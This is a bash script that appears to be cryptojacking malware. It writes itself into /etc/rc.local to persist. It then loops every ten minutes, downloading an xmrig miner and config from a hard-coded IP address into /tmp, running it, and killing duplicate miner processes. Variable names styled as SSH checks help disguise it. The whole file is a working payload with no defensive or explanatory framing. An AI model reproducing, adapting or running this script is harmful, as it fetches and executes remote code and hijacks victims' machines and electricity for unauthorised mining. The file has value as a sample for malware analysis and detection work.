#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                qun:10776622
#                2016-06-14

if [ "sh /etc/mlwk.sh &" = "$(cat /etc/rc.local | grep /etc/mlwk.sh | grep -v grep)" ]; then
    echo ""
else
    echo "sh /etc/mlwk.sh &" >> /etc/rc.local
fi

while [ 1 ]; do
    Centos_sshd_killn=$(ps aux | grep "/tmp/xmrig" | grep -v grep | wc -l)
    if [[ $Centos_sshd_killn -eq 0 ]]; then
        if [ ! -f "/tmp/xmrig" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                ./wget -P /tmp/  http://61.136.101.125:6358/config.json
                ./wget -P /tmp/  http://61.136.101.125:6358/xmrig &> /dev/null
                chmod 777 /tmp/xmrig
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/xmrig &
        #./xmrig &
    elif [[ $Centos_sshd_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "xmrig" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$(($Centos_sshd_killn-1))
            if [[ $Centos_sshd_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/xmrig" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/xmrig" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                ./wget -P /tmp/  http://61.136.101.125:6358/config.json
                ./wget -P /tmp/  http://61.136.101.125:6358/xmrig &> /dev/null
                chmod 777 /tmp/xmrig
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/xmrig &
        #./xmrig &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "xmrig" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    sleep 600
done

